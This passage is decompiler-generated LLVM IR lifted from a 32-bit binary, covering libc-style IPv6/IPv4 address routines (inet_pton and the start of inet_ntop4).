  %v0_8056ea8 = load i32, i32* @edi, align 4
  %v9_8056ea8 = icmp eq i32 %v0_8056ea8, 4
  store i1 %v9_8056ea8, i1* %zf.global-to-local, align 1
  br i1 %v9_8056ea8, label %dec_label_pc_8056ed8, label %dec_label_pc_8056ead

dec_label_pc_8056ead:                             ; preds = %dec_label_pc_8056ea8
  %v0_8056ead = load i32, i32* @esi, align 4
  %v1_8056ead = add i32 %v0_8056ead, 1
  store i32 %v1_8056ead, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_8056eb0 = inttoptr i32 %v1_8056ead to i8*
  store i8 0, i8* %v1_8056eb0, align 1
  br label %dec_label_pc_8056eb3.backedge

dec_label_pc_8056eb3.backedge:                    ; preds = %dec_label_pc_8056ead, %dec_label_pc_8056e9b, %dec_label_pc_8056e8f
  %v0_8056eb3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056eb3 = inttoptr i32 %v0_8056eb3.pre to i8*
  %v2_8056eb3 = load i8, i8* %v1_8056eb3, align 1
  %v3_8056eb3 = sext i8 %v2_8056eb3 to i32
  store i32 %v3_8056eb3, i32* @ecx, align 4
  %v1_8056eb6 = add i32 %v0_8056eb3.pre, 1
  store i32 %v1_8056eb6, i32* %ebx.global-to-local, align 4
  %v1_8056eb7 = icmp eq i8 %v2_8056eb3, 0
  store i1 %v1_8056eb7, i1* %zf.global-to-local, align 1
  %v1_8056eb9 = icmp eq i1 %v1_8056eb7, false
  br i1 %v1_8056eb9, label %dec_label_pc_8056e76, label %dec_label_pc_8056eb3.dec_label_pc_8056ebb_crit_edge

dec_label_pc_8056eb3.dec_label_pc_8056ebb_crit_edge: ; preds = %dec_label_pc_8056eb3.backedge
  %v0_8056ebb.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056ebb

dec_label_pc_8056ebb:                             ; preds = %dec_label_pc_8056eb3.dec_label_pc_8056ebb_crit_edge, %entry
  %v0_8056ebb = phi i32 [ %v0_8056ebb.pre, %dec_label_pc_8056eb3.dec_label_pc_8056ebb_crit_edge ], [ 0, %entry ]
  %v10_8056ebb = icmp eq i32 %v0_8056ebb, 3
  store i1 %v10_8056ebb, i1* %zf.global-to-local, align 1
  %v7_8056ebe = icmp sgt i32 %v0_8056ebb, 3
  br i1 %v7_8056ebe, label %dec_label_pc_8056ec0, label %dec_label_pc_8056ed8

dec_label_pc_8056ec0:                             ; preds = %dec_label_pc_8056ebb
  %v0_8056ec0 = load i32, i32* @eax, align 4
  %v3_8056ec9 = bitcast i32* %stack_var_-20 to i16*
  %v4_8056ec9 = call i32 @memcpy(i16* %v3_8056ec9, i32 4, i32 %v0_8056ec0)
  %v0_8056ed3 = load i32, i32* @esp, align 4
  %v6_8056ed3 = icmp eq i32 %v0_8056ed3, -16
  store i1 %v6_8056ed3, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8056eda

dec_label_pc_8056ed8:                             ; preds = %dec_label_pc_8056ea8, %dec_label_pc_8056ea4, %dec_label_pc_8056e9f, %dec_label_pc_8056e95, %dec_label_pc_8056e7e, %dec_label_pc_8056ebb
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8056eda.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056eda

dec_label_pc_8056eda:                             ; preds = %dec_label_pc_8056ec0, %dec_label_pc_8056ed8
  %v0_8056eda = phi i32 [ %v15_8056e68, %dec_label_pc_8056ec0 ], [ %v0_8056eda.pre, %dec_label_pc_8056ed8 ]
  %v0_8056ee1 = phi i32 [ 1, %dec_label_pc_8056ec0 ], [ 0, %dec_label_pc_8056ed8 ]
  %v9_8056eda = icmp eq i32 %v0_8056eda, -28
  store i1 %v9_8056eda, i1* %zf.global-to-local, align 1
  %v2_8056edd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056edd, i32* @ebx, align 4
  store i32 %v0_8056e62, i32* @esi, align 4
  ret i32 %v0_8056ee1

; uselistorder directives
  uselistorder i32 %v0_8056ebb, { 1, 0 }
  uselistorder i32 %v3_8056eb3, { 1, 0 }
  uselistorder i8 %v2_8056eb3, { 1, 2, 0 }
  uselistorder i1 %v9_8056ea8, { 1, 0 }
  uselistorder i32 %v1_8056e96, { 1, 0 }
  uselistorder i32 %v3_8056e84, { 1, 2, 0, 3 }
  uselistorder i8 %v2_8056eb322, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 14 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_8056eda, { 1, 0 }
  uselistorder label %dec_label_pc_8056ed8, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8056e76, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8056ee2 = load i32, i32* @ebp, align 4
  %v0_8056ee3 = load i32, i32* @edi, align 4
  %v0_8056ee4 = load i32, i32* @esi, align 4
  %v0_8056ee5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8056eed = ptrtoint i8* %arg2 to i32
  store i32 %v4_8056eed, i32* @edi, align 4
  %v9_8056ef1 = icmp eq i32 %arg1, 2
  br i1 %v9_8056ef1, label %dec_label_pc_8056f01, label %dec_label_pc_8056ef6

dec_label_pc_8056ef6:                             ; preds = %entry
  %v9_8056ef6 = icmp eq i32 %arg1, 10
  %v1_8056ef9 = icmp eq i1 %v9_8056ef6, false
  br i1 %v1_8056ef9, label %dec_label_pc_8057092, label %dec_label_pc_8056f11

dec_label_pc_8056f01:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8056eed, i32* @eax, align 4
  %v3_8056f07 = call i32 @inet_pton4(i32 %v0_8056ee5, i32 %v0_8056ee4, i32 %v0_8056ee3)
  store i32 %v3_8056f07, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80570a4

dec_label_pc_8056f11:                             ; preds = %dec_label_pc_8056ef6
  %v2_8056f16 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056f16, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_8056f1b = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_8056f1b, i32* @ebx, align 4
  %v2_8056f22 = add i32 %v5_8056f1b, 16
  store i32 %v2_8056f22, i32* %eax.global-to-local, align 4
  %v0_8056f2c = load i32, i32* @edi, align 4
  %v1_8056f2c = inttoptr i32 %v0_8056f2c to i8*
  %v2_8056f2c = load i8, i8* %v1_8056f2c, align 1
  %v11_8056f2c = icmp eq i8 %v2_8056f2c, 58
  %v1_8056f2f = icmp eq i1 %v11_8056f2c, false
  br i1 %v1_8056f2f, label %dec_label_pc_8056fc2, label %dec_label_pc_8056f31

dec_label_pc_8056f31:                             ; preds = %dec_label_pc_8056f11
  %v1_8056f31 = add i32 %v0_8056f2c, 1
  store i32 %v1_8056f31, i32* @edi, align 4
  %v1_8056f32 = inttoptr i32 %v1_8056f31 to i8*
  %v2_8056f32 = load i8, i8* %v1_8056f32, align 1
  %v11_8056f32 = icmp eq i8 %v2_8056f32, 58
  %v1_8056f35 = icmp eq i1 %v11_8056f32, false
  br i1 %v1_8056f35, label %dec_label_pc_80570a2, label %dec_label_pc_8056fc2

dec_label_pc_8056f49:                             ; preds = %dec_label_pc_8057002
  %v0_8056f4a = load i32, i32* @edi, align 4
  %v1_8056f4a = add i32 %v0_8056f4a, 1
  store i32 %v1_8056f4a, i32* @edi, align 4
  %v4_8056f52 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805afb4.564, i32 0, i32 0), i32 %v2_8057009)
  store i32 %v4_8056f52, i32* %eax.global-to-local, align 4
  %v1_8056f5a = icmp eq i32 %v4_8056f52, 0
  br i1 %v1_8056f5a, label %dec_label_pc_8056f79, label %dec_label_pc_8056f5e

dec_label_pc_8056f5e:                             ; preds = %dec_label_pc_8056f49
  %v0_8056f5e = load i32, i32* @ebp, align 4
  %v2_8056f5e = mul i32 %v0_8056f5e, 16
  %v1_8056f61 = add i32 %v4_8056f52, -134590388
  store i32 %v1_8056f61, i32* %eax.global-to-local, align 4
  %v2_8056f66 = or i32 %v2_8056f5e, %v1_8056f61
  store i32 %v2_8056f66, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_8056f66, 65536
  br i1 %tmp, label %dec_label_pc_8056f5e.dec_label_pc_8057002.outer_crit_edge, label %dec_label_pc_80570a2

dec_label_pc_8056f5e.dec_label_pc_8057002.outer_crit_edge: ; preds = %dec_label_pc_8056f5e
  %v0_8057002.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057002.outer

dec_label_pc_8057002.outer:                       ; preds = %dec_label_pc_8056f5e.dec_label_pc_8057002.outer_crit_edge, %dec_label_pc_8056fc2
  %v0_8057002.pre = phi i32 [ %v0_8057002.pre.pre, %dec_label_pc_8056f5e.dec_label_pc_8057002.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_8056fc2 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8056f5e.dec_label_pc_8057002.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_8056fc2 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8056f5e.dec_label_pc_8057002.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_8056fc2 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8056f5e.dec_label_pc_8057002.outer_crit_edge ], [ 0, %dec_label_pc_8056fc2 ]
  %v4_8056f7e = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8056f83 = icmp eq i1 %v4_8056f7e, false
  br label %dec_label_pc_8057002

dec_label_pc_8056f79:                             ; preds = %dec_label_pc_8056f49
  %v0_8056f79 = load i32, i32* @esi, align 4
  %v9_8056f79 = icmp eq i32 %v0_8056f79, 58
  %v1_8056f7c = icmp eq i1 %v9_8056f79, false
  br i1 %v1_8056f7c, label %dec_label_pc_8056fce, label %dec_label_pc_8056f7e

dec_label_pc_8056f7e:                             ; preds = %dec_label_pc_8056f79
  br i1 %v1_8056f83, label %dec_label_pc_8056f9a, label %dec_label_pc_8056f85

dec_label_pc_8056f85:                             ; preds = %dec_label_pc_8056f7e
  %v5_8056f85 = icmp eq i8* %stack_var_-44.1, null
  %v1_8056f8a = icmp eq i1 %v5_8056f85, false
  br i1 %v1_8056f8a, label %dec_label_pc_80570a2, label %dec_label_pc_8056f90

dec_label_pc_8056f90:                             ; preds = %dec_label_pc_8056f85
  %v0_8056f90 = load i32, i32* @ebx, align 4
  %v5_8056f90 = inttoptr i32 %v0_8056f90 to i8*
  %v0_8056f94 = load i32, i32* @edi, align 4
  %v5_8056f94 = inttoptr i32 %v0_8056f94 to i8*
  br label %dec_label_pc_8057002

dec_label_pc_8056f9a:                             ; preds = %dec_label_pc_8056f7e
  %v0_8056f9a = load i32, i32* @edi, align 4
  %v1_8056f9a = inttoptr i32 %v0_8056f9a to i8*
  %v2_8056f9a = load i8, i8* %v1_8056f9a, align 1
  %v3_8056f9a = icmp eq i8 %v2_8056f9a, 0
  br i1 %v3_8056f9a, label %dec_label_pc_80570a2, label %dec_label_pc_8056fa3

dec_label_pc_8056fa3:                             ; preds = %dec_label_pc_8056f9a
  %v0_8056fa3 = load i32, i32* @ebx, align 4
  %v1_8056fa3 = add i32 %v0_8056fa3, 2
  store i32 %v1_8056fa3, i32* @edx, align 4
  %v6_8056faa = icmp ugt i32 %v1_8056fa3, %v2_8056f22
  br i1 %v6_8056faa, label %dec_label_pc_80570a2, label %dec_label_pc_8056fb0

dec_label_pc_8056fb0:                             ; preds = %dec_label_pc_8056fa3
  %v0_8056fb0 = load i32, i32* @ebp, align 4
  %v2_8056fb2 = udiv i32 %v0_8056fb0, 256
  %v4_8056fb2 = trunc i32 %v2_8056fb2 to i8
  %v3_8056fb5 = inttoptr i32 %v0_8056fa3 to i8*
  store i8 %v4_8056fb2, i8* %v3_8056fb5, align 1
  %v0_8056fb7 = load i32, i32* @ebp, align 4
  store i32 %v0_8056fb7, i32* %eax.global-to-local, align 4
  %v1_8056fb9 = trunc i32 %v0_8056fb7 to i8
  %v2_8056fb9 = load i32, i32* @ebx, align 4
  %v3_8056fb9 = add i32 %v2_8056fb9, 1
  %v4_8056fb9 = inttoptr i32 %v3_8056fb9 to i8*
  store i8 %v1_8056fb9, i8* %v4_8056fb9, align 1
  %v0_8056fbc = load i32, i32* @edx, align 4
  store i32 %v0_8056fbc, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056fc2

dec_label_pc_8056fc2:                             ; preds = %dec_label_pc_8056f11, %dec_label_pc_8056f31, %dec_label_pc_8056fb0
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8056fb0 ], [ %v1_8056f31, %dec_label_pc_8056f31 ], [ %v0_8056f2c, %dec_label_pc_8056f11 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8056fb0 ], [ null, %dec_label_pc_8056f31 ], [ null, %dec_label_pc_8056f11 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8057002.outer

dec_label_pc_8056fce:                             ; preds = %dec_label_pc_8056f79
  %v9_8056fce = icmp eq i32 %v0_8056f79, 46
  %v1_8056fd1 = icmp eq i1 %v9_8056fce, false
  br i1 %v1_8056fd1, label %dec_label_pc_80570a2, label %dec_label_pc_8056fd7

dec_label_pc_8056fd7:                             ; preds = %dec_label_pc_8056fce
  %v0_8056fd7 = load i32, i32* @ebx, align 4
  %v1_8056fd7 = add i32 %v0_8056fd7, 4
  store i32 %v1_8056fd7, i32* @esi, align 4
  %v6_8056fde = icmp ugt i32 %v1_8056fd7, %v2_8056f22
  br i1 %v6_8056fde, label %dec_label_pc_80570a2, label %dec_label_pc_8056fe4

dec_label_pc_8056fe4:                             ; preds = %dec_label_pc_8056fd7
  %v4_8056fe4 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8056fe4, i32* @eax, align 4
  store i32 %v0_8056fd7, i32* @edx, align 4
  store i32 %v1_8056fd7, i32* @ebx, align 4
  %v2_8056fec = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8056fec = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8056fec, i32 %v2_8056f22)
  store i32 %v5_8056fec, i32* %eax.global-to-local, align 4
  %tmp62 = icmp slt i32 %v5_8056fec, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_8057039, label %dec_label_pc_80570a2

dec_label_pc_8057002:                             ; preds = %dec_label_pc_8057002.outer, %dec_label_pc_8056f90
  %v0_8057002 = phi i32 [ %v0_8056f94, %dec_label_pc_8056f90 ], [ %v0_8057002.pre, %dec_label_pc_8057002.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8056f90, %dec_label_pc_8056f90 ], [ %stack_var_-44.1.ph, %dec_label_pc_8057002.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8056f94, %dec_label_pc_8056f90 ], [ %stack_var_-36.1.ph, %dec_label_pc_8057002.outer ]
  %v1_8057002 = inttoptr i32 %v0_8057002 to i8*
  %v2_8057002 = load i8, i8* %v1_8057002, align 1
  %v3_8057002 = sext i8 %v2_8057002 to i32
  store i32 %v3_8057002, i32* %eax.global-to-local, align 4
  %v2_8057009 = call i32 @__GI_tolower(i32 %v3_8057002)
  store i32 %v2_8057009, i32* %eax.global-to-local, align 4
  %v1_8057011 = icmp eq i32 %v2_8057009, 0
  store i32 %v2_8057009, i32* @esi, align 4
  %v1_8057015 = icmp eq i1 %v1_8057011, false
  br i1 %v1_8057015, label %dec_label_pc_8056f49, label %dec_label_pc_805701b

dec_label_pc_805701b:                             ; preds = %dec_label_pc_8057002
  br i1 %v4_8056f7e, label %dec_label_pc_8057039, label %dec_label_pc_8057022

dec_label_pc_8057022:                             ; preds = %dec_label_pc_805701b
  %v0_8057022 = load i32, i32* @ebx, align 4
  %v1_8057022 = add i32 %v0_8057022, 2
  store i32 %v1_8057022, i32* @edx, align 4
  %v6_8057029 = icmp ugt i32 %v1_8057022, %v2_8056f22
  br i1 %v6_8057029, label %dec_label_pc_80570a2, label %dec_label_pc_805702b

dec_label_pc_805702b:                             ; preds = %dec_label_pc_8057022
  %v0_805702b = load i32, i32* @ebp, align 4
  %v2_805702d = udiv i32 %v0_805702b, 256
  %v4_805702d = trunc i32 %v2_805702d to i8
  %v3_8057030 = inttoptr i32 %v0_8057022 to i8*
  store i8 %v4_805702d, i8* %v3_8057030, align 1
  %v0_8057032 = load i32, i32* @ebp, align 4
  store i32 %v0_8057032, i32* %eax.global-to-local, align 4
  %v1_8057034 = trunc i32 %v0_8057032 to i8
  %v2_8057034 = load i32, i32* @ebx, align 4
  %v3_8057034 = add i32 %v2_8057034, 1
  %v4_8057034 = inttoptr i32 %v3_8057034 to i8*
  store i8 %v1_8057034, i8* %v4_8057034, align 1
  %v0_8057037 = load i32, i32* @edx, align 4
  store i32 %v0_8057037, i32* @ebx, align 4
  br label %dec_label_pc_8057039

dec_label_pc_8057039:                             ; preds = %dec_label_pc_805701b, %dec_label_pc_8056fe4, %dec_label_pc_805702b
  %v4_8057039 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8057039 = icmp eq i8* %stack_var_-44.1, null
  %v0_8057071.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8057039, label %dec_label_pc_8057071, label %dec_label_pc_8057040

dec_label_pc_8057040:                             ; preds = %dec_label_pc_8057039
  store i32 1, i32* @esi, align 4
  %v6_8057047 = sub i32 %v0_8057071.pre, %v4_8057039
  store i32 %v6_8057047, i32* @edi, align 4
  %v16_805704b = icmp eq i32 %v0_8057071.pre, %v2_8056f22
  %v1_805704f = icmp eq i1 %v16_805704b, false
  br i1 %v1_805704f, label %dec_label_pc_8057069.preheader, label %dec_label_pc_80570a2

dec_label_pc_8057069.preheader:                   ; preds = %dec_label_pc_8057040
  %v3_805706989 = inttoptr i32 %v6_8057047 to i8*
  %v9_805706b98 = icmp slt i8* %v3_805706989, inttoptr (i32 1 to i8*)
  br i1 %v9_805706b98, label %dec_label_pc_805706d, label %dec_label_pc_8057053

dec_label_pc_8057053:                             ; preds = %dec_label_pc_8057069.preheader, %dec_label_pc_8057053
  %v0_8057061100 = phi i32 [ %v0_8057069.pre, %dec_label_pc_8057053 ], [ 1, %dec_label_pc_8057069.preheader ]
  %v0_805705399 = phi i32 [ %v1_8057069.pre, %dec_label_pc_8057053 ], [ %v6_8057047, %dec_label_pc_8057069.preheader ]
  %v2_8057059 = sub i32 %v0_805705399, %v0_8057061100
  %v6_805705b = add i32 %v2_8057059, %v4_8057039
  store i32 %v6_805705b, i32* %eax.global-to-local, align 4
  %v2_805705f = sub i32 %v2_8056f22, %v0_8057061100
  store i32 %v2_805705f, i32* @ecx, align 4
  %v1_8057061 = add i32 %v0_8057061100, 1
  store i32 %v1_8057061, i32* @esi, align 4
  %v1_8057062 = inttoptr i32 %v6_805705b to i8*
  %v2_8057062 = load i8, i8* %v1_8057062, align 1
  %v3_8057062 = zext i8 %v2_8057062 to i32
  %v4_8057062 = load i32, i32* @edx, align 4
  %v5_8057062 = and i32 %v4_8057062, -256
  %v6_8057062 = or i32 %v5_8057062, %v3_8057062
  store i32 %v6_8057062, i32* @edx, align 4
  %v3_8057064 = inttoptr i32 %v2_805705f to i8*
  store i8 %v2_8057062, i8* %v3_8057064, align 1
  %v0_8057066 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057066 = inttoptr i32 %v0_8057066 to i8*
  store i8 0, i8* %v1_8057066, align 1
  %v0_8057069.pre = load i32, i32* @esi, align 4
  %v1_8057069.pre = load i32, i32* @edi, align 4
  %v2_8057069 = inttoptr i32 %v0_8057069.pre to i8*
  %v3_8057069 = inttoptr i32 %v1_8057069.pre to i8*
  %v9_805706b = icmp sgt i8* %v2_8057069, %v3_8057069
  br i1 %v9_805706b, label %dec_label_pc_805706d, label %dec_label_pc_8057053

dec_label_pc_805706d:                             ; preds = %dec_label_pc_8057053, %dec_label_pc_8057069.preheader
  br label %dec_label_pc_8057071

dec_label_pc_8057071:                             ; preds = %dec_label_pc_8057039, %dec_label_pc_805706d
  %v0_8057071 = phi i32 [ %v2_8056f22, %dec_label_pc_805706d ], [ %v0_8057071.pre, %dec_label_pc_8057039 ]
  %v16_8057071 = icmp eq i32 %v0_8057071, %v2_8056f22
  %v1_8057075 = icmp eq i1 %v16_8057071, false
  br i1 %v1_8057075, label %dec_label_pc_80570a2, label %dec_label_pc_8057077

dec_label_pc_8057077:                             ; preds = %dec_label_pc_8057071
  store i32 %v2_8056f16, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_8057083 = call i32 @memcpy(i16* %tmp64, i32 %v2_8056f16, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80570a4

dec_label_pc_8057092:                             ; preds = %dec_label_pc_8056ef6
  %v1_8057092 = call i32 @__errno_location(i32 %v0_8056ee5)
  %v1_8057097 = inttoptr i32 %v1_8057092 to i32*
  store i32 97, i32* %v1_8057097, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80570a4

dec_label_pc_80570a2:                             ; preds = %dec_label_pc_8056fa3, %dec_label_pc_8056f9a, %dec_label_pc_8056f5e, %dec_label_pc_8056f85, %dec_label_pc_8057040, %dec_label_pc_8056fe4, %dec_label_pc_8057071, %dec_label_pc_8057022, %dec_label_pc_8056fd7, %dec_label_pc_8056fce, %dec_label_pc_8056f31
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80570a4

dec_label_pc_80570a4:                             ; preds = %dec_label_pc_8057092, %dec_label_pc_8057077, %dec_label_pc_8056f01, %dec_label_pc_80570a2
  %v0_80570ab = phi i32 [ -1, %dec_label_pc_8057092 ], [ 1, %dec_label_pc_8057077 ], [ %v3_8056f07, %dec_label_pc_8056f01 ], [ 0, %dec_label_pc_80570a2 ]
  store i32 %v0_8056ee5, i32* @ebx, align 4
  store i32 %v0_8056ee4, i32* @esi, align 4
  store i32 %v0_8056ee3, i32* @edi, align 4
  store i32 %v0_8056ee2, i32* @ebp, align 4
  ret i32 %v0_80570ab

; uselistorder directives
  uselistorder i32 %v1_8057069.pre, { 1, 0 }
  uselistorder i32 %v0_8057069.pre, { 1, 0 }
  uselistorder i32 %v0_8057061100, { 2, 1, 0 }
  uselistorder i32 %v0_8057071.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8057009, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_8056f22, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_8056ee5, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80570a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80570a2, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8057071, { 1, 0 }
  uselistorder label %dec_label_pc_8057053, { 1, 0 }
  uselistorder label %dec_label_pc_8057039, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057002, { 1, 0 }
  uselistorder label %dec_label_pc_8056fc2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057002.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_80570ad = load i32, i32* @edi, align 4
  %v0_80570ae = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_80570b2 = ptrtoint i32* %stack_var_-76 to i32
  %v0_80570b5 = load i32, i32* @eax, align 4
  %v3_80570b9 = and i32 %v0_80570b5, -65536
  %v2_80570bf = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_80570c4 = load i32, i32* @edx, align 4
  %v5_80570c4 = inttoptr i32 %v0_80570c4 to i8*
  store i8* %v5_80570c4, i8** %stack_var_-56, align 4
  %v0_80570c8 = load i32, i32* @ecx, align 4
  store i32 %v3_80570b9, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_80570d3 = add i32 %v2_80570bf, 4
  store i32 %v6_80570d3, i32* %edi.global-to-local, align 4
  %v2_80570d4 = inttoptr i32 %v6_80570d3 to i32*
  store i32 0, i32* %v2_80570d4, align 4
  %v3_80570d4 = load i32, i32* %edi.global-to-local, align 4
  %v6_80570d4 = add i32 %v3_80570d4, 4
  store i32 %v6_80570d4, i32* %edi.global-to-local, align 4
  %v0_80570d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80570d5 = inttoptr i32 %v6_80570d4 to i32*
  store i32 %v0_80570d5, i32* %v2_80570d5, align 4
  %v3_80570d5 = load i32, i32* %edi.global-to-local, align 4
  %v6_80570d5 = add i32 %v3_80570d5, 4
  store i32 %v6_80570d5, i32* %edi.global-to-local, align 4
  %v0_80570d6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80570d6 = trunc i32 %v0_80570d6 to i16
  %v3_80570d6 = inttoptr i32 %v6_80570d5 to i16*
  store i16 %v1_80570d6, i16* %v3_80570d6, align 2
  %v4_80570d6 = load i32, i32* %edi.global-to-local, align 4
  %v7_80570d6 = add i32 %v4_80570d6, 2
  %v0_80570d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80570d8 = trunc i32 %v0_80570d8 to i8
  %v3_80570d8 = inttoptr i32 %v7_80570d6 to i8*
  store i8 %v1_80570d8, i8* %v3_80570d8, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_805717330 = load i32, i32* @esi, align 4
  %v10_805717336 = icmp eq i32 %v0_805717330, 3
  store i1 %v10_805717336, i1* %zf.global-to-local, align 1
  %v7_805717638 = icmp sgt i32 %v0_805717330, 3
  br i1 %v7_805717638, label %dec_label_pc_805717c, label %dec_label_pc_80570e0

dec_label_pc_80570e0:                             ; preds = %dec_label_pc_8057153, %entry
  %v3_80570f6 = phi i32 [ 0, %entry ], [ %v1_805717c.pre, %dec_label_pc_8057153 ]
  %v0_805717339 = phi i32 [ %v0_805717330, %entry ], [ %v0_8057173, %dec_label_pc_8057153 ]
  %v2_80570e6 = add i32 %v0_805717339, %v0_80570b5
  %v12_80570e6 = icmp eq i32 %v2_80570e6, 0
  store i1 %v12_80570e6, i1* %zf.global-to-local, align 1
  store i32 %v2_80570e6, i32* %ebp.global-to-local, align 4
  %v1_80570e8 = inttoptr i32 %v2_80570e6 to i8*
  %v2_80570e8 = load i8, i8* %v1_80570e8, align 1
  %v3_80570e8 = zext i8 %v2_80570e8 to i32
  %v4_80570e8 = load i32, i32* @edx, align 4
  %v5_80570e8 = and i32 %v4_80570e8, -65536
  %v6_80570e8 = or i32 %v5_80570e8, %v3_80570e8
  store i32 %v6_80570e8, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_80570e8, 100
  %v6_80570ef = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_80570e8, 100
  %v12_80570ef = zext i8 %tmp24 to i32
  %v14_80570ef = mul nuw nsw i32 %v12_80570ef, 256
  %v15_80570ef = or i32 %v6_80570ef, %v5_80570e8
  %v16_80570ef = or i32 %v15_80570ef, %v14_80570ef
  store i32 %v16_80570ef, i32* %eax.global-to-local, align 4
  %v2_80570f3 = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_80570f6 = load i32, i32* @esp, align 4
  %v4_80570f6 = add i32 %v2_80570f6, 43
  %v5_80570f6 = add i32 %v4_80570f6, %v3_80570f6
  %v6_80570f6 = inttoptr i32 %v5_80570f6 to i8*
  store i8 %v2_80570f3, i8* %v6_80570f6, align 1
  %v0_80570fa = load i32, i32* %edi.global-to-local, align 4
  %v1_80570fa = add i32 %v0_80570fa, 1
  store i32 %v0_80570fa, i32* @ecx, align 4
  %v0_8057103 = load i32, i32* @esp, align 4
  %v2_8057103 = add i32 %v0_80570fa, 43
  %v3_8057103 = add i32 %v2_8057103, %v0_8057103
  %v4_8057103 = inttoptr i32 %v3_8057103 to i8*
